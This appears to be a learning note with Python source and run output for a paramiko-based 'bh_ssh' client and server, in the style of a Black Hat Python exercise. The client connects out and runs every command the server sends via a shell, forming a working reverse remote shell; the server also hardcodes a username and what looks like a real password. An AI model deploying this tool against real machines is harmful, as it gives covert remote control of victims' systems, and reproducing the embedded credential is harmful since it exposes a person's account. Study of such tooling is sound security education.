# Client - Server
## Source code
### Server part
```python
import os
import paramiko
import socket
import sys
import threading

pwd = os.path.dirname(os.path.realpath(__file__))
hostkey = paramiko.RSAKey(filename=os.path.join(pwd, 'test_rsa.key'))

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_password(self, username, password):
        if (username == 'artemdanilishin') and (password == 'Lfybkbiby2002!'):
            return paramiko.AUTH_SUCCESSFUL


if __name__ == "__main__":
    server = '127.0.0.1'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print(f'[-] Listen failed: {str(e)}')
        sys.exit(1)
    else:
        print(f'[+] Got a connection! Client: {client}, addr: {addr}')

    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(hostkey)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print('*** No channel.')
        sys.exit(1)

    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')
    try:
        while True:
            command = input('Enter command: ')
            if not command:
                continue
            else:
                if command != 'exit':
                    chan.send(command)
                    r = chan.recv(8192)
                    print(r.decode())
                else:
                    chan.send('exit')
                    print('exiting')
                    bhSession.close()
                    break
    except KeyboardInterrupt:
        bhSession.close()
```

### Client part
```python
import paramiko
import subprocess
import shlex

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command + '\n')
    data = ssh_session.recv(1024).decode()
    print(data)
    while True:
        cmd = ssh_session.recv(1024).decode()
        if not cmd:
            continue
        else:
            try:
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(cmd, shell=True)
                ssh_session.send(cmd_output or 'okey')
            except Exception as e:
                ssh_session.send(str(e))
                client.close()
    client.close()
    return


# ip = '127.0.0.1'
# user = 'artemdanilishin'
# port = 2222
# password = 'password'
if __name__ == "__main__":
    import getpass
    user = input('Username: ')
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter server port: ')
    ssh_command(ip, port, user, password, 'echo "Client connected"')
```

## Outputs
### Server part
```python
[+] Listening for connection ...
[+] Got a connection! Client: <socket.socket fd=6, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 2222), raddr=('127.0.0.1', 64520)>, addr: ('127.0.0.1', 64520)
[+] Authenticated!
b'echo "Client connected"\n'
Enter command: ls
Client_Server.md
NetCat.md
NetTools.md
Sources
SSH_Paramiko.md
TCP_proxy.md
test.py
```

### Client part
```python
Username: artemdanilishin
Password: 
Enter server IP: 127.0.0.1
Enter server port: 2222
Welcome to bh_ssh
```